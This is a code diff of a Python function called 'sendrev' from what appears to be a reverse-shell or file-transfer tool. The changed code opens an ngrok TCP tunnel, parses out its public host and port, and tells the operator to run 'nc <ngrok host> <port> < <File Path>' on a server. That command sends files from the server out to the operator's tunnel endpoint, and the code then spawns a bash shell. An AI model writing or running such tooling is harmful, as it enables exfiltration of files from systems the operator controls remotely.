@@ -134,13 +134,21 @@ def sendrev():
         
             ''')
             token = input("[+] Ngrok Token\n==> ")
+            
             ngrok.set_auth_token(token)
             ques5 = input("\nPort\n==> ")
             new_ip = ngrok.connect(int(ques5), 'tcp')
+            new_ip1 = new_ip.split("/")
+            ngrok_ip = new_ip1[2]            
+            new_ip2 = ngrok_ip.split(":")
+            ngrok_ip2 = new_ip2[0]
+            ngrok_port = new_ip2[1]
+
             prLightPurple(f'''
             
     [+] Run This Command On Server: 
-    ==> nc {ques5} {ques5} < <File Path>
+    ==> nc {ngrok_ip2} {ngrok_port} < <File Path>
+
 
             ''')
             child = pexpect.spawn("/bin/bash")
